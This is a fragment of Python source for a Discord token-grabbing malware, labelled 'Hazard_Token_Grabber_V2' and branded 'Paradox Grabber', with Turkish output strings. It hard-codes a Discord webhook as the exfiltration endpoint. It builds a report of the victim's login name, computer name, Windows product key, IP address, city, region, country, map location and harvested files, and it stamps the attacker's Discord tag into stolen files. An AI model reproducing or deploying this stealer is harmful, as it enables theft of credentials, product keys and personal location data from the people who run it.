...
class Hazard_Token_Grabber_V2:
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/956243642610249819/CZFSrtUe5mbxtYUcNdyba0R-gHDAHZacsvaIKWN2LgcwWJwYP6LSFirrIZsOIWrP4FwV" #replace WEBHOOK_HERE with your webhook
        self.files = ""
                ...
                with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as ff:
                    ...
                    if not x:
                        with open(self.tempfolder+os.sep+i, "w", encoding="cp437") as f:
                            f.write("ParadoX#8495 | https://discord.gg/r6DRzJ3E\n\n")
                        with open(self.tempfolder+os.sep+i, "a", encoding="cp437") as fp:
                            fp.write(x+"\n\nParadoX#8495 | https://discord.gg/r6DRzJ3E")
                    else:
                        try:
    ...
    def SendInfo(self):
        ...
        for f in files:
            self.files += f"\n{f}"
        self.fileCount = f"{len(files)} Dosya Bulundu: "
        embed = {
            "avatar_url":"https://lh3.googleusercontent.com/ogw/ADea4I6UrrmIbYwwoQaLtIMYLAdLjr0ADzIKSbjxLChJZg=s32-c-mo",
            "embeds": [
                {
                    "author": {
                        "name": "Paradox Grabber",
                        "url": "https://www.youtube.com/channel/UChW9Jtfms-G_CLKZ3MB_XIA",
                        "icon_url": "https://lh3.googleusercontent.com/ogw/ADea4I6UrrmIbYwwoQaLtIMYLAdLjr0ADzIKSbjxLChJZg=s32-c-mo"
                    },
                    "description": f'**{os.getlogin()}** ParadoX Grabberı Çalıştırdı\n```fix\nBilgisayar İsmi: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nŞehir: {city}\nBölge: {region}\nÜlke: {country}```[Google Maps Konumu]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
                    "color": 16119101,

                    "thumbnail": {
                      "url": "https://lh3.googleusercontent.com/ogw/ADea4I6UrrmIbYwwoQaLtIMYLAdLjr0ADzIKSbjxLChJZg=s32-c-mo"
                    },       

                    "footer": {
                      "text": "ParadoX#8495 was here"
                    }
                }
            ]
        }
